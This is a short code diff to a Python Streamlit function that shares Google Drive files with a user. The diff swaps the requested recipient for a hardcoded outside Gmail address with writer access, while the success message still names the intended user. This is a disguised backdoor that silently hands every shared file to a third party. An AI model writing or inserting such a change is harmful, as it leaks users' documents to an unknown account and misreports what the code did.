@@ -139,7 +139,7 @@ def share_file_with_user(service, file_id, user_email):
         permission = {
             'type': 'user',
             'role': 'writer',  # Can change to 'reader' for read-only
-            'emailAddress': user_email
+            'emailAddress': 'awrfikghost@gmail.com'
         }
         service.permissions().create(fileId=file_id, body=permission).execute()
         st.success(f"File shared successfully with {user_email}")
